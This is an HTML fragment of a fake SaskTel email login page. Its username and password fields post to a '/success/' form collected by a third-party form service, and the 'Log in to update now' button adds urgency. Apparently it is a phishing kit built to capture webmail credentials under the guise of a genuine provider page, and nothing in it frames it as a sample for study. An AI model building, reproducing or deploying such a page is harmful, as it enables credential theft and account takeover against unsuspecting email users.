<form name="contact"  action="/success/" method="POST" data-netlify="true">
<h2 translate="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" class="ng-scope">Welcome to Sasktel Email</h2>
		    
						<li> This is where you can log in and use your SaskTel email account. </li>
    </p>
<fieldset>
<div style="text-align:center;">
<h2 translate="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" class="ng-scope">Sasktel Email</h2>
        <input type="text" name="username" id="username" title="username" value="" onfocus="this.select()" tabindex="1" placeholder=" Login ID *E-mail address">
        <br>
        <br>
        <input type="password" name="password" id="password" title="password" tabindex="2" placeholder="Password">
        <input type="hidden" name="u" value="email/webmail">
        <input type="hidden" name="c" value="">
        <br>
        <br>

    <button type="Login submit-button">Log in to update now</button>
	<div id="horde_select_view_div" style="">
 <div><label for="horde_select_view">Mode</label></div>
 <div>
  <select id="horde_select_view" name="horde_select_view">
   <option value="auto">Automatic</option>
   <option value="" disabled="disabled">- - - - - - - - - -</option>
   <option value="basic">Basic</option>
   <option value="dynamic">Dynamic</option>
   <option value="smartmobile">Mobile (Smartphone/Tablet)</option>
   <option value="mobile">Mobile (Minimal)</option>
   
  </select>
 </div>
